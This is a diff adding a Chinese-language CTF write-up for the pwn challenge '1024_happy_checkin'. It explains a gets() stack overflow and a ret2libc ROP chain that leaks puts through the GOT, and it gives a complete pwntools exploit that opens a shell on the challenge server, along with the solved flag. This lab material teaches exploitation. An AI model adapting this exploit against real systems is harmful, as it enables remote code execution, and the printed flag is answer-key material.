@@ -1073,3 +1073,62 @@ io.interactive()
 
 ------
 
+------
+
+### 1024_happy_checkin
+
+先`file ./1024_happy_checkin`查看文件类型再`checksec --file=1024_happy_checkin`检查了一下文件保护情况。
+
+![](https://paper.tanyaodan.com/CTFShow/1024_happy_checkin/1.png)
+
+用`IDA Pro 64bit`打开附件`1024_happy_checkin`，按`F5`反汇编源码并查看主函数，发现有个`char`型数组变量`s`，`s`的长度只有`0x370h`，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。
+
+在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。
+
+![](https://paper.tanyaodan.com/CTFShow/1024_happy_checkin/2.png)
+
+在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`和`pop_ret`的地址。
+
+```bash
+ROPgadget --binary ./1024_happy_checkin --only "pop|ret"
+```
+
+![](https://paper.tanyaodan.com/CTFShow/1024_happy_checkin/3.png)
+
+编写`Python`代码即可得到`ctfshow{851446cc-4ff9-4a2b-945d-f901ca234ba8}`。
+
+```python
+from pwn import *
+from LibcSearcher import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('pwn.challenge.ctf.show', 28107)
+e = ELF('./1024_happy_checkin')
+pop_rdi = 0x4006e3 # ROPgadget --binary ./1024_happy_checkin --only "pop|ret"
+puts_plt = e.plt['puts']
+info('puts_plt => 0x%x', puts_plt)
+puts_got = e.got['puts']
+info('puts_got => 0x%x', puts_got)
+main_address = e.symbols['main']
+info('main_address => 0x%x', main_address)
+payload = b'a'*0x370 + b'pwn1024!' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_address)
+io.sendlineafter(b'welcome_to_ctfshow_1024_cup,input_your_ticket\n', payload)
+io.recvline()
+puts_address = u64(io.recv(6).ljust(8, b'\x00'))
+libc = LibcSearcher('puts', puts_address) # libc版本, libc6_2.27-0ubuntu3_amd64 or libc6_2.27-3ubuntu1_amd64
+pop_ret = 0x4004c6 # ROPgadget --binary ./1024_happy_checkin --only "pop|ret"
+libcbase = puts_address - libc.dump('puts')
+log.success('libcbase_address => %s', hex(libcbase))
+system_address = libcbase + libc.dump('system')
+info('system_address => 0x%x', system_address)
+bin_sh_address = libcbase + libc.dump('str_bin_sh')
+info('bin_sh_address => 0x%x', bin_sh_address)
+payload = b'a'*0x370 + b'pwn1024!' + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
+io.sendline(payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/CTFShow/1024_happy_checkin/4.png)
+
+------
+
